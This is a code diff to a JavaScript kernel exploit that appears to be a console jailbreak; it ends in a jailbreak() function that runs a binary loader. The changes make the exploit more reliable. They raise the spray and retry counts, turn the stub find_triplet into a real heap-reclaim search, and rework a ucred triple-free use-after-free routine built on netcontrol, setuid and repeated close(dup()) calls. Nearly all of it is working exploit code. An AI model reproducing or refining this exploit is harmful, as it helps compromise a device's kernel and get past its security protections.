@@ -114,13 +114,13 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 8;
-var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 4;
-var MAIN_LOOP_ITERATIONS = 2;
-var TRIPLEFREE_ITERATIONS = 2;
-var MAX_ROUNDS_TWIN = 4;
-var MAX_ROUNDS_TRIPLET = 4;
+var IPV6_SOCK_NUM = 32;
+var IOV_THREAD_NUM = 100;
+var UIO_THREAD_NUM = 100;
+var MAIN_LOOP_ITERATIONS = 3;
+var TRIPLEFREE_ITERATIONS = 20;
+var MAX_ROUNDS_TWIN = 100;
+var MAX_ROUNDS_TRIPLET = 120;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -236,37 +236,18 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   }
   return read32(sockopt_len_ptr);
 }
-// 1) الدالة الأصلية
 function set_rthdr(sd, buf, len) {
   return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
+  // return ret;
 }
-
-// 2) احفظ الأصلية
-var real_set_rthdr = set_rthdr;
-
-// 3) wrapper اختياري للّوج
-set_rthdr = function (sock, buf, len) {
-  log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
-  var ret = real_set_rthdr(sock, buf, len);
-  log("[RTHDR] AFTER ret=" + ret);
-  return ret;
-};
-
-// 1) الأصلية
 function get_rthdr(sd, buf, max_len) {
   return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
+  // return ret;
 }
-
-// 2) احفظ الأصلية
-var real_get_rthdr = get_rthdr;
-
-// 3) wrapper للّوج لو حابب
-get_rthdr = function (sock, buf, len) {
-  log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
-  var ret = real_get_rthdr(sock, buf, len);
-  log("[RTHDR-GET] AFTER ret=" + ret);
-  return ret;
-};
 function free_rthdrs(sds) {
   for (var sd of sds) {
     if (!sd.eq(BigInt_Error)) {
@@ -496,7 +477,7 @@ function wait_for(addr, threshold) {
     threshold = new BigInt(0x0, threshold);
   }
   var spins = 0;
-  var MAX_SPINS = 50000;
+  var MAX_SPINS = 100000;
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(2);
     spins++;
@@ -791,19 +772,12 @@ function find_twins() {
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
-
   twins[0] = -1;
   twins[1] = -1;
-
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-
-    if (typeof debugging !== 'undefined' &&
-        debugging.info && debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         cleanup();
@@ -812,50 +786,66 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
-
-    // رشّ الهيدر
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // قراءة الهيدر
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
       val = read32(leak_add);
       j = val & 0xFFFF;
-
-      // الشرط الجديد — الصح
-      if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
         log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
-
     count++;
   }
-
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
+function find_triplet(master, other, iterations) {
+  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+  var count = 0;
+  var val, i, j;
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add = leak_rthdr.add(0x04);
+  while (count < iterations) {
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (i === master || i === other) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
-function find_triplet(master, other) {
-  var triplet1 = master;
-  var triplet2 = other;
-  return { t1: triplet1, t2: triplet2 };
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add); // تعديل رقم 2
+
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
+    write32(leak_add, 0); // تعديل رقم 4
+    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+    val = read32(leak_add);
+    j = val & 0xFFFF;
+
+    // تعديل رقم 3 (منع false positives)
+    if (j === master || j === other) {
+      count++;
+      continue;
+    }
+    if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
+      return j;
+    }
+    count++;
+  }
+  return -1;
 }
-
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
@@ -1092,7 +1082,7 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  send_notification('Subhan Allah wa biHamdih, Subhan Allah al-Azeem');
+  send_notification ('Subhan Allah wa biHamdih, Subhan Allah al-Azeem');
   send_notification('[Stability by DV M. ELHOUT]');
 }
 function safe_fhold_fd(fd, label) {
@@ -1278,55 +1268,38 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 10;
-
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
 function trigger_ucred_triplefree() {
-
   var end = false;
-  var uaf_socket = -1;
 
+  // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
-
   var main_count = 0;
-
-  send_notification("=== START TRIPLEFREE LOOP ===");
-
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
-
     main_count++;
-    send_notification("=== LOOP #" + main_count + " START ===");
 
-    // STEP 1
-    send_notification("[STEP 1] Creating dummy socket");
+    // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-
-    var sock_buf = malloc(8);
-    write32(sock_buf, dummy_socket);
-    netcontrol(-1, 0x20000003, sock_buf, 8);
+    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFFn)));
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
     close(new BigInt(dummy_socket));
 
-    // STEP 2
-    send_notification("[STEP 2] Allocating new ucred");
+    // 2) allocate new ucred
     setuid(1);
 
-    // STEP 3
-    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[STEP 3] Reclaimed uaf_socket=" + uaf_socket);
+    // 3) reclaim fd → uaf_socket
+    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
 
-    // STEP 4
-    send_notification("[STEP 4] Freeing previous ucred");
+    // 4) free previous ucred
     setuid(1);
 
-    // STEP 5
-    send_notification("[STEP 5] Unregistering uaf_socket");
-    var ctrl_buf = malloc(8);
-    write32(ctrl_buf, uaf_socket);
-    netcontrol(-1, 0x20000007, ctrl_buf, 8);
+    // 5) unregister → free file + ucred
+    write32(nc_clear_buf, uaf_socket);
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
-    // STEP 6
-    send_notification("[STEP 6] Light refcount fix loop");
+    // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
@@ -1334,88 +1307,79 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
     }
 
-    // STEP 7
-    send_notification("[STEP 7] First double-close");
+    // 7) double free أول مرة
     close(dup(new BigInt(uaf_socket)));
 
-    // STEP 8 — إيجاد التوينز
-    send_notification("[STEP 8] Finding twins...");
+    // 8) إيجاد التوأم
     end = find_twins();
-    send_notification("[STEP 8] find_twins returned end=" + end +
-                      " twins=[" + twins[0] + "," + twins[1] + "]");
-
     if (!end) {
-      send_notification("[STEP 8] Twins not found → CONTINUE LOOP");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
-
-    // STEP 9 — تحرير التوين الثاني
-    send_notification("[STEP 9] Freeing twins index=" + twins[1]);
+    // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
+    // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
+    var count = 0;
+    var refcnt_add = leak_rthdr.add(0x04);
+    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      // شغّل recvmsg
+      trigger_iov_recvmsg();
 
-    send_notification("[STEP 10] Proceeding with triplets using twins=" + twins[0]);
+      // كمّل دورة iov بالكامل
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
 
-    // STEP 11 — تجهيز master triplet
-    send_notification("[STEP 11] Setting master triplet from twins=" + twins[0]);
+      // دلوقتي بس نقرأ refcount
+      write32(refcnt_add, 0);
+      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
+      if (read32(refcnt_add) === 1) break;
+      count++;
+    }
+    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      twins[0] = -1;
+      twins[1] = -1;
+      close(new BigInt(uaf_socket));
+      end = false;
+      continue;
+    }
     triplets[0] = twins[0];
-    send_notification("[STEP 11] triplets[0] = " + triplets[0]);
 
-    // STEP 12 — إيجاد التريبلت الأول
-    send_notification("[STEP 12] Calling find_triplet(master=" + triplets[0] + ", skip=-1)");
-    triplets[1] = twins[0];
-    send_notification("[STEP 12] find_triplet returned triplet1=" + triplets[1]);
-
-    if (triplets[1] === -1) {
-      send_notification("[STEP 12] triplet1 NOT FOUND → closing uaf_socket + CONTINUE");
-      close(new BigInt(uaf_socket));
-      continue;
-    }
-
-    send_notification("[STEP 12] triplet1 FOUND OK");
-
-    // STEP 13 — إيجاد التريبلت الثاني
-    send_notification("[STEP 13] Calling find_triplet(master=" + triplets[0] + ", skip=" + triplets[1] + ")");
-    triplets[2] = twins[1];
-    send_notification("[STEP 13] find_triplet returned triplet2=" + triplets[2]);
-
-    if (triplets[2] === -1) {
-      send_notification("[STEP 13] triplet2 NOT FOUND → closing uaf_socket + CONTINUE");
-      close(new BigInt(uaf_socket));
-      continue;
-    }
-
-    send_notification("[STEP 13] triplet2 FOUND OK");
-
-    // STEP 14 — تنفيذ الإجراء النهائي
-    send_notification("[STEP 14] Performing final close on uaf_socket=" + uaf_socket);
+    // 11) triple free فعليًا
     close(dup(new BigInt(uaf_socket)));
-    send_notification("[STEP 14] final close DONE");
 
-    // STEP 15 — قراءة بعد الفلو
-    trigger_iov_recvmsg();
-    send_notification("[STEP 15] Sending 1 byte to iov_sock_1 to unblock read...");
+    // 12) إيجاد triplet 1
+    triplets[1] = find_triplet(triplets[0], -1);
+    if (triplets[1] === -1) {
+      twins[0] = -1;
+      twins[1] = -1;
+      write(new BigInt(iov_sock_1), tmp, 1);
+      close(new BigInt(uaf_socket));
+      end = false;
+      continue;
+    }
     write(new BigInt(iov_sock_1), tmp, 1);
-    send_notification("[STEP 15] Waiting for iov_recvmsg...");
+
+    // 13) إيجاد triplet 2
+    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    if (triplets[2] === -1) {
+      twins[0] = -1;
+      twins[1] = -1;
+      close(new BigInt(uaf_socket));
+      end = false;
+      continue;
+    }
     wait_iov_recvmsg();
-    send_notification("[STEP 15] Reading from iov_sock_0...");
     read(new BigInt(iov_sock_0), tmp, 1);
-    send_notification("[STEP 15] Read complete");
-
-    send_notification("=== LOOP #" + main_count + " END ===");
-
-
-  } // END WHILE
-
-  send_notification("[END] Flow completed → SUCCESS");
+  }
+  if (main_count === TRIPLEFREE_ITERATIONS) {
+    return false;
+  }
   return true;
-
 }
-
-
 function leak_kqueue() {
   debug('Leaking kqueue...');
   // 1) صفّر الذاكرة مرة واحدة فقط
@@ -1505,12 +1469,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 1200;
-var KWRITE_MAX_UIO_RECLAIM = 1200;
+var KREAD_MAX_UIO_RECLAIM = 2000;
+var KWRITE_MAX_UIO_RECLAIM = 2000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 500;
-var KWRITE_MAX_IOV_RECLAIM = 500;
+var KREAD_MAX_IOV_RECLAIM = 1200;
+var KWRITE_MAX_IOV_RECLAIM = 1200;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 5;
